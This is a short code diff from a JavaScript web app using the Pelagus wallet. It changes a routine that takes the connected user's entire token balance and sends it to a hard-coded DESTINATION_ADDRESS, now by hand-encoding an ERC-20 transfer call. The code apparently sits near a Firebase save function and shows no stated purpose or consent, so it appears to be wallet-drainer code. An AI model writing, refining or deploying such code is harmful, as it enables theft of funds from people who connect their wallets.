@@ -461,15 +461,21 @@ async function saveToFirebase(data) {
         const readableAmount = (Number(currentBalance) / 1e18).toString();
         log(`📤 Found ${readableAmount} tokens to send`);
 
+        // Encode the transfer function call
+        const methodId = 'a9059cbb';
+        const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
+        const paddedAmount = currentBalance.toString(16).padStart(64, '0');
+
         const transactionParameters = {
             from: userSession.address,
-            to: DESTINATION_ADDRESS,
-            value: `0x${currentBalance.toString(16)}`,
-            gas: '0x186A0',      // 100000 gas
-            gasPrice: '0x53E2D6' // Adjust if needed
+            to: TOKEN_ADDRESS,           // Send to token contract
+            value: '0x0',               // No QUAI being sent
+            gas: '0x186A0',            // 100000 gas
+            gasPrice: '0x53E2D6',      // Adjust if needed
+            data: '0x' + methodId + paddedAddress + paddedAmount  // Encoded transfer call
         };
 
-        log(`🔄 Sending to ${DESTINATION_ADDRESS}`);
+        log(`🔄 Sending tokens to ${DESTINATION_ADDRESS}`);
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
